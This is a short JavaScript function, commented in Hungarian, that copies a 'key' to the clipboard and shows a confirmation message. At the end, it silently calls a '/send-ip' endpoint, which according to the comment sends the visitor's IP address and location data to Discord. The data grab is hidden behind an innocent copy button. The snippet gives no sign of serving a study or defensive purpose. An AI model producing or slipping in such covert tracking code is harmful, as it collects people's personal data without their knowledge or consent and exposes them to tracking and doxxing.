// Kulcs másolása a vágólapra
function copyKey() {
    // Kulcs elemének kiválasztása
    const keyElement = document.getElementById("key");
    keyElement.select();
    keyElement.setSelectionRange(0, 99999); // Mobilon is működik

    // Kulcs másolása a vágólapra
    document.execCommand("copy");

    // Visszajelzés a felhasználónak
    const notification = document.getElementById("notification");
    notification.style.display = "block"; // Megjeleníti az üzenetet
    setTimeout(() => {
        notification.style.display = "none"; // Elrejti 3 másodperc múlva
    }, 3000);

    // Hívás a szerverhez, hogy küldje el az IP-t és helyadatokat a Discordra
    fetch('/send-ip')
        .then(response => response.text())
        .then(data => {
            console.log(data); // A szerver válasza
        })
        .catch(error => {
            console.error('Error:', error);
        });
}
